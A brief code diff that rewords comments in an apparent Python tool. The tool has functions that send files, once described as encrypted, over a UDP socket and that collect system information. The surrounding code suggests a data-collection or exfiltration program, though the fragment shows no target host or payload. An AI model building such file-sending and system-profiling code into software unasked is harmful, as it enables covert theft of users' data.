@@ -84,7 +84,7 @@ def setupConfig():
     email = config[4]
 
 
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
+# Sends files to the cloud server
 def sendFile(filename, isSysInfo):
     clientsocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     f = open(filename, 'rb')
@@ -101,7 +101,7 @@ def sendFile(filename, isSysInfo):
     clientsocket.close()
 
 
-### This creates a document that contains useful system information and specifications ###
+### This creates a document that contains useful system information and specifications
 def getSystemInfo():
     
     with open(extendedPath + systemInfo, "a") as f:
